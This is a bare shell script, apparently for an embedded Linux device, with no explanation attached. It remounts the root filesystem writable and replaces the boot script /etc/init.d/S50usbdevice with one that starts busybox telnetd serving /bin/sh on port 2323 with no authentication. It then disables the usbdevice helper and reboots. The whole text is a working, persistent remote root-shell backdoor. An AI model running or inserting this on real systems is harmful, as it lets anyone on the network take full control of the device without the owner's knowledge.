mount -o remount,rw / 2>/dev/null || true
test -f /etc/init.d/S50usbdevice.cvbak || cp -a /etc/init.d/S50usbdevice /etc/init.d/S50usbdevice.cvbak
printf '%s\n' \
'#!/bin/sh' \
'busybox telnetd -l /bin/sh -p 2323 2>/dev/null' \
'ifconfig lo up 2>/dev/null' \
'exit 0' > /etc/init.d/S50usbdevice
chmod 755 /etc/init.d/S50usbdevice
printf '%s\n' '#!/bin/sh' 'exit 0' > /usr/bin/usbdevice
chmod 755 /usr/bin/usbdevice
echo STUB
cat /etc/init.d/S50usbdevice
sync
sync
reboot
